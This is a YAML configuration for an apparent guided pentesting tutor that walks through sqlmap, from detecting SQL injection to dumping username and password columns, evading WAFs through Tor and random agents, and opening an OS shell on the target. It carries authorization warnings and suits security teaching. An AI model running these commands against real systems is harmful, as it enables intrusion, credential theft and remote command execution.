@@ -1,0 +1,190 @@
+tool_id: sqlmap
+display_name: "sqlmap"
+binary_candidates: [sqlmap]
+categories: [web_app, exploitation]
+os_profile: kali
+one_liner: "Detects and exploits SQL-injection flaws in a web app's parameters."
+authorization_gate: true
+authorization_text: >
+  SQL-injection testing against systems you do not own or lack explicit written
+  permission to test is illegal in most jurisdictions. Continue only for authorized
+  targets. Practice legally on DVWA, bWAPP, sqli-labs, OWASP Juice Shop, or your own
+  lab VM. Interactive shells (Flow H) need a second explicit confirmation. Continue?
+flows:
+  - flow_id: detect
+    title: "Detect an injection point"
+    goal: "Find whether a parameter is injectable and identify the DBMS."
+    command_builder_id: sqlmap
+    slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT]
+    steps:
+      - step_id: sd1
+        title: "Test a URL parameter"
+        slot_target: TARGET_PIVOT
+        glossary_refs: [sql_injection, injection_point, dbms, parameter, batch]
+        explanation:
+          what: "`-u` names the URL+parameter under test; `--batch` uses defaults without prompts."
+          why: "Lowest-impact starting point — just detect, don't dump."
+          where: "TARGET_PIVOT (-u); --batch in GLOBAL_OPTIONS."
+        try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch"
+        success_criteria: "sqlmap reports a parameter is injectable and names the DBMS."
+        alternatives:
+          - trigger: "all tested parameters do not appear to be injectable"
+            cause: "Default depth too shallow, or wrong parameter."
+            fix: "Raise depth: --level 3 and/or --risk 2; target one param with -p."
+            check: "Re-run with --level 3."
+          - trigger: "needs POST/cookie/login"
+            cause: "The injectable input is behind auth or in POST body."
+            fix: "Use the authenticated flow (-r request.txt or --data/--cookie)."
+            check: "Switch to the auth_post flow."
+  - flow_id: enum_dbs
+    title: "Enumerate databases"
+    goal: "List the databases the parameter can reach."
+    command_builder_id: sqlmap
+    slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, ACTION_OPTIONS]
+    steps:
+      - step_id: se1
+        title: "List databases with --dbs"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [dbms]
+        explanation:
+          what: "`--dbs` lists databases; `--current-db`/`--is-dba` show context."
+          why: "Map structure before pulling any data."
+          where: "ACTION_OPTIONS."
+        try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch --dbs"
+        success_criteria: "A list of database names prints."
+        alternatives:
+          - trigger: "limited privileges / not a DBA"
+            cause: "The injected user has restricted rights."
+            fix: "Note the limit; continue with what is readable."
+            check: "Try --current-db / --current-user."
+  - flow_id: enum_tables
+    title: "Enumerate tables & columns"
+    goal: "List tables in a database, then columns in a table."
+    command_builder_id: sqlmap
+    slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, ACTION_OPTIONS]
+    steps:
+      - step_id: st1
+        title: "Tables then columns (scoped by -D/-T)"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "`-D <db> --tables`, then `-D <db> -T <table> --columns`."
+          why: "Narrow scope before any dump."
+          where: "ACTION_OPTIONS (-D/-T scope)."
+        try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch -D shop -T users --columns"
+        success_criteria: "Table list, then the columns of the chosen table."
+        alternatives:
+          - trigger: "table/column not found"
+            cause: "Wrong database/table name."
+            fix: "Re-list with --tables under the right -D."
+            check: "Confirm names from the enum step."
+  - flow_id: dump
+    title: "Dump data (targeted, minimal)"
+    goal: "Extract specific columns only."
+    command_builder_id: sqlmap
+    slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, ACTION_OPTIONS, OUTPUT_OPTIONS]
+    steps:
+      - step_id: sdu1
+        title: "Dump selected columns"
+        slot_target: ACTION_OPTIONS
+        destructive: true
+        recovery: "Take the minimum needed; --dump-all is rarely appropriate and over-collects."
+        explanation:
+          what: "`-D <db> -T <table> -C <c1,c2> --dump` extracts the named columns."
+          why: "Pull the minimum you need; results auto-save to the output dir."
+          where: "ACTION_OPTIONS; --output-dir in OUTPUT_OPTIONS."
+        try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch -D shop -T users -C username,password --dump"
+        success_criteria: "The selected columns' rows are extracted and saved."
+        alternatives:
+          - trigger: "huge table / very slow"
+            cause: "Dumping an entire large table."
+            fix: "Limit rows with --start/--stop, and prefer specific -C."
+            check: "Re-run with --start 1 --stop 20."
+  - flow_id: tune
+    title: "Tune level, risk & technique (the depth dial)"
+    goal: "Trade speed for thoroughness deliberately."
+    command_builder_id: sqlmap
+    slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, ACTION_OPTIONS]
+    steps:
+      - step_id: stu1
+        title: "Set level / risk / technique"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [level, risk, technique]
+        explanation:
+          what: "`--level 1..5` (how many places), `--risk 1..3` (payload heaviness), `--technique=BEU` (types)."
+          why: "Higher finds more but is slower/noisier; --dbms hints the backend."
+          where: "ACTION_OPTIONS."
+        try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch --level 4 --risk 2 --technique=BEU"
+        success_criteria: "Detection succeeds within acceptable time."
+        alternatives:
+          - trigger: "too slow"
+            cause: "High level/risk or broad technique set."
+            fix: "Narrow --technique and lower --level."
+            check: "Compare runtime."
+          - trigger: "false negatives"
+            cause: "Depth too low for this app."
+            fix: "Raise --level (and --risk if authorized)."
+            check: "Re-test at --level 5."
+  - flow_id: auth_post
+    title: "Authenticated / POST / saved request"
+    goal: "Test inside a logged-in context."
+    command_builder_id: sqlmap
+    slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, EXTRA_FILES]
+    steps:
+      - step_id: sa1
+        title: "Use a saved request file"
+        slot_target: TARGET_PIVOT
+        glossary_refs: [request_file, parameter]
+        explanation:
+          what: "`-r request.txt` carries target+headers+cookies+body from a saved HTTP request."
+          why: "Best way to test logged-in apps; --data/--cookie are alternatives."
+          where: "TARGET_PIVOT (-r); POST/cookie data in EXTRA_FILES."
+        try_this: "sqlmap -r request.txt --batch -p id"
+        success_criteria: "sqlmap tests within the authenticated context."
+        alternatives:
+          - trigger: "session expired mid-run"
+            cause: "Cookie/request file went stale."
+            fix: "Refresh the cookie/request file; consider --csrf-token options."
+            check: "Re-export the request and retry."
+  - flow_id: proxy_tor
+    title: "Through a proxy / Tor / blend in"
+    goal: "Route and pace traffic."
+    command_builder_id: sqlmap
+    slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, ENV_INTERFACE]
+    steps:
+      - step_id: sp1
+        title: "Route via a proxy"
+        slot_target: ENV_INTERFACE
+        glossary_refs: [tamper]
+        explanation:
+          what: "`--proxy http://127.0.0.1:8080` routes via Burp/ZAP; `--tor --check-tor` anonymizes."
+          why: "Watch traffic, pace with --delay/--threads, vary UA with --random-agent."
+          where: "ENV_INTERFACE (proxy/tor)."
+        try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch --proxy http://127.0.0.1:8080 --random-agent"
+        success_criteria: "Requests appear in your proxy; scan proceeds."
+        alternatives:
+          - trigger: "blocked by a WAF"
+            cause: "A web application firewall is filtering payloads."
+            fix: "Discuss --tamper scripts conceptually (authorized only); slow with --delay."
+            check: "Lower rate; review WAF responses."
+  - flow_id: advanced_shell
+    title: "Advanced: interactive shells (high impact)"
+    goal: "Move from reading data to executing commands (authorized only)."
+    command_builder_id: sqlmap
+    slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, ACTION_OPTIONS]
+    steps:
+      - step_id: sx1
+        title: "Open an OS shell (extra confirmation required)"
+        slot_target: ACTION_OPTIONS
+        destructive: true
+        recovery: "--os-shell executes commands on the target — serious legal exposure. Lab/authorized only; abort if unsure."
+        explanation:
+          what: "`--sql-shell` (interactive SQL), `--os-shell` (OS commands where allowed)."
+          why: "High impact — depends on DBMS/privileges/stacked-query support."
+          where: "ACTION_OPTIONS."
+        try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch --os-shell"
+        success_criteria: "An interactive shell opens (only on authorized targets)."
+        alternatives:
+          - trigger: "shell not available"
+            cause: "DBMS/privileges/stacked queries don't support it."
+            fix: "Confirm DBA rights and stacked-query support; otherwise not possible."
+            check: "Review --is-dba and DBMS capabilities."
